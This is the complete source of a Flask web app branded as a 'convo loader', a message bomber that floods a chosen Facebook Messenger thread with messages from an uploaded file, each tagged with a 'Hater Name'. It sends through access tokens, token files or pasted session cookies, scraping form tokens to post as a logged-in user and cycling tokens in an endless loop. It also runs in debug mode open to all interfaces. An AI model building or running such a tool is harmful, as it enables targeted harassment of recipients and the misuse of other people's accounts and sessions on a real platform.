from flask import Flask, request, render_template_string, jsonify, session
import requests
import threading
import uuid
import time
import os
from datetime import datetime
import re

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

active_sessions = {}

def message_bomber(session_key, config):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    try:
        msg_list = config['messages']
        msg_count = len(msg_list)
        msg_index = 0  # For repeat mode

        while not active_sessions[session_key]['stop_flag']:
            for token in (config['tokens'] if config['tokens'] else [None]):
                if msg_count == 0:
                    active_sessions[session_key]['logs'].append("⚠️ No messages found!")
                    return
                # Repeat mode: always pick next message, wrap around
                message = msg_list[msg_index % msg_count]
                msg_index += 1

                msg_text = f"{config['hater_name']} {message}"
                if config['auth_type'] == 'cookie':
                    thread_url = f"https://mbasic.facebook.com/messages/thread/{config['thread_id']}/"
                    get_resp = requests.get(thread_url, cookies=config['cookies'], headers=headers)
                    if "send" not in get_resp.text:
                        active_sessions[session_key]['logs'].append(f"❌ Thread not found or login failed")
                        time.sleep(config['delay'])
                        continue
                    try:
                        fb_dtsg = re.search(r'name="fb_dtsg" value="(.*?)"', get_resp.text).group(1)
                        jazoest = re.search(r'name="jazoest" value="(.*?)"', get_resp.text).group(1)
                    except Exception:
                        active_sessions[session_key]['logs'].append(f"❌ Failed to extract tokens")
                        time.sleep(config['delay'])
                        continue
                    data = {
                        'fb_dtsg': fb_dtsg,
                        'jazoest': jazoest,
                        'body': msg_text,
                        'send': 'Send'
                    }
                    response = requests.post(thread_url, data=data, cookies=config['cookies'], headers=headers)
                else:
                    params = {'message': msg_text}
                    if token:
                        params['access_token'] = token
                    response = requests.post(
                        f"https://graph.facebook.com/v15.0/t_{config['thread_id']}/",
                        data=params,
                        headers=headers
                    )
                log_entry = f"[{datetime.now().strftime('%H:%M:%S')}] "
                if (
                    (config['auth_type'] == 'cookie' and "send" not in response.text)
                    or (config['auth_type'] != 'cookie' and response.status_code == 200)
                ):
                    log_entry += f"✅ Sent: {msg_text}"
                else:
                    log_entry += f"❌ Failed: {response.text[:100]}"
                active_sessions[session_key]['logs'].append(log_entry)
                time.sleep(config['delay'])
    except Exception as e:
        active_sessions[session_key]['logs'].append(f"⚠️ Critical Error: {str(e)}")
    finally:
        active_sessions[session_key]['status'] = 'stopped'

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟-𝗦𝗛𝗔𝗥𝗔𝗕𝗜-𝗖𝗢𝗡𝗩𝗢-𝗟𝗢𝗗𝗘𝗥 🦋</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --gradient-1: #ff6b6b;
            --gradient-2: #4ecdc4;
        }
        body {
            background: linear-gradient(45deg, var(--gradient-1), var(--gradient-2));
            min-height: 100vh;
            font-family: 'Courier New', monospace;
            animation: gradientShift 15s ease infinite;
        }
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .main-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            margin: 2rem auto;
            max-width: 600px;
        }
        .brand-header {
            font-family: 'Arial Black', sans-serif;
            text-align: center;
            margin: 20px 0;
            background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: brandGlow 2s ease-in-out infinite alternate;
        }
        @keyframes brandGlow {
            from { text-shadow: 0 0 10px #ff00ff; }
            to { text-shadow: 0 0 20px #00ffff, 0 0 30px #ff00ff; }
        }
        .contact-bar {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin: 15px 0;
        }
        .wp-logo, .fb-logo {
            font-size: 2.5rem;
            transition: transform 0.3s ease;
        }
        .wp-logo:hover, .fb-logo:hover {
            transform: rotate(360deg) scale(1.2);
        }
        .footer-brand {
            font-size: 1.5rem;
            text-align: center;
            margin-top: 30px;
            background: linear-gradient(90deg, #ff0000, #00ff00, #0000ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradientFlow 5s linear infinite;
        }
        @keyframes gradientFlow {
            0% { background-position: 0% 50%; }
            100% { background-position: 100% 50%; }
        }
        .log-box {
            height: 300px;
            overflow-y: auto;
            background: #1a1a1a;
            color: #00ff00;
            border-radius: 10px;
            font-family: 'Consolas', monospace;
            padding: 1rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="main-card p-4">
            <h1 class="brand-header">🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟-𝗦𝗛𝗔𝗥𝗔𝗕𝗜-𝗖𝗢𝗡𝗩𝗢-𝗟𝗢𝗗𝗘𝗥 🦋</h1>
            <div style="text-align:center;font-size:1.2rem;font-weight:bold;margin-bottom:10px;">
                𝗔𝗡𝗬 𝗞𝗜𝗡𝗗 𝗛𝗘𝗟𝗣 𝗙𝗢𝗥 𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗦𝗛𝗔𝗥𝗔𝗕𝗜
            </div>
            <div class="contact-bar">
                <a href="https://wa.me/919024870456" target="_blank" class="wp-logo">
                    <i class="fab fa-whatsapp" style="color: #25D366;"></i>
                    <span style="font-size: 0.8rem; display: block;">9024870456</span>
                </a>
                <a href="https://www.facebook.com/share/1UwbbMrmBY" target="_blank" class="fb-logo">
                    <i class="fab fa-facebook" style="color: #1877F2;"></i>
                </a>
            </div>
            <!-- Auth Type Selector -->
            <div class="btn-group w-100 mb-4">
                <button type="button" class="btn btn-outline-danger auth-btn active" data-type="token">
                    <i class="fas fa-key"></i> Single Token
                </button>
                <button type="button" class="btn btn-outline-warning auth-btn" data-type="multi">
                    <i class="fas fa-file"></i> Token File
                </button>
                <button type="button" class="btn btn-outline-success auth-btn" data-type="cookie">
                    <i class="fas fa-cookie-bite"></i> Cookies
                </button>
            </div>
            <!-- Dynamic Form -->
            <form id="bombForm">
                <div id="formContent"></div>
                <div class="mb-3">
                    <label class="form-label">Message File</label>
                    <input type="file" class="form-control" name="messages" required>
                </div>
                <button type="submit" class="btn btn-danger w-100 py-2">
                    <i class="fas fa-rocket"></i> START
                </button>
            </form>
            <div class="mt-4" id="sessionPanel" style="display: none;">
                <div class="input-group">
                    <input type="text" class="form-control" id="sessionKey" readonly>
                    <button class="btn btn-outline-primary" onclick="copySession()">
                        <i class="fas fa-copy"></i>
                    </button>
                    <button class="btn btn-outline-danger" onclick="stopBombing()">
                        <i class="fas fa-stop-circle"></i> STOP
                    </button>
                </div>
                <div class="log-box mt-3" id="logContainer"></div>
            </div>
            <div class="footer-brand">
                𝗧𝗛𝗜𝗦 𝗧𝗢𝗢𝗟 𝗠𝗔𝗗𝗘 𝗕𝗬 ☠️𝗠𝗥 𝗗𝗘𝗩𝗜𝗟=𝟮𝟬𝟮𝟱☠️
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let currentAuthType = 'token';
        const authButtons = document.querySelectorAll('.auth-btn');
        authButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                authButtons.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                currentAuthType = btn.dataset.type;
                updateForm();
            });
        });
        function updateForm() {
            const formContent = document.getElementById('formContent');
            let html = `
                <div class="mb-3">
                    <label class="form-label">Thread ID</label>
                    <input type="text" class="form-control" name="thread_id" required>
                </div>
                <div class="mb-3">
                    <label class="form-label">Hater Name</label>
                    <input type="text" class="form-control" name="hater_name" required>
                </div>
                <div class="mb-3">
                    <label class="form-label">Delay (seconds)</label>
                    <input type="number" class="form-control" name="delay" value="5" min="1" required>
                </div>`;
            if(currentAuthType === 'token') {
                html += `
                    <div class="mb-3">
                        <label class="form-label">Access Token</label>
                        <input type="text" class="form-control" name="token" required>
                    </div>`;
            }
            else if(currentAuthType === 'multi') {
                html += `
                    <div class="mb-3">
                        <label class="form-label">Token File</label>
                        <input type="file" class="form-control" name="tokens" accept=".txt" required>
                    </div>`;
            }
            else {
                html += `
                    <div class="mb-3">
                        <label class="form-label">Cookies</label>
                        <textarea class="form-control" name="cookies" rows="3" 
                                  placeholder="c_user=...; xs=...;" required></textarea>
                    </div>`;
            }
            formContent.innerHTML = html;
        }
        updateForm();
        document.getElementById('bombForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            formData.append('auth_type', currentAuthType);
            const response = await fetch('/start', {
                method: 'POST',
                body: formData
            });
            const data = await response.json();
            if(data.success) {
                document.getElementById('sessionKey').value = data.session_key;
                document.getElementById('sessionPanel').style.display = 'block';
                startLogUpdates(data.session_key);
            }
            else {
                alert('Error: ' + data.error);
            }
        });
        function startLogUpdates(sessionKey) {
            const logContainer = document.getElementById('logContainer');
            setInterval(async () => {
                const response = await fetch(`/logs?key=${sessionKey}`);
                const logs = await response.json();
                logContainer.innerHTML = logs.join('<br>');
                logContainer.scrollTop = logContainer.scrollHeight;
            }, 1000);
        }
        function copySession() {
            navigator.clipboard.writeText(document.getElementById('sessionKey').value);
        }
        async function stopBombing() {
            const response = await fetch('/stop', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    session_key: document.getElementById('sessionKey').value
                })
            });
            const data = await response.json();
            alert(data.message);
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start', methods=['POST'])
def start_bombing():
    try:
        config = {
            'auth_type': request.form.get('auth_type'),
            'thread_id': request.form.get('thread_id'),
            'hater_name': request.form.get('hater_name'),
            'delay': int(request.form.get('delay')),
            'messages': request.files['messages'].read().decode().splitlines(),
            'tokens': [],
            'cookies': {}
        }
        if config['auth_type'] == 'token':
            config['tokens'] = [request.form.get('token')]
        elif config['auth_type'] == 'multi':
            config['tokens'] = request.files['tokens'].read().decode().splitlines()
        elif config['auth_type'] == 'cookie':
            for cookie in request.form.get('cookies').split(';'):
                if '=' in cookie:
                    key, val = cookie.strip().split('=', 1)
                    config['cookies'][key] = val
        session_key = str(uuid.uuid4())
        active_sessions[session_key] = {
            'stop_flag': False,
            'logs': [],
            'status': 'running',
            'thread': threading.Thread(target=message_bomber, args=(session_key, config))
        }
        active_sessions[session_key]['thread'].start()
        return jsonify({'success': True, 'session_key': session_key})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/stop', methods=['POST'])
def stop_bombing():
    session_key = request.json.get('session_key')
    if session_key in active_sessions:
        active_sessions[session_key]['stop_flag'] = True
        return jsonify({'message': 'Bombing sequence terminated!'})
    return jsonify({'error': 'Invalid session key'})

@app.route('/logs')
def get_logs():
    session_key = request.args.get('key')
    if session_key in active_sessions:
        return jsonify(active_sessions[session_key]['logs'])
    return jsonify([])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
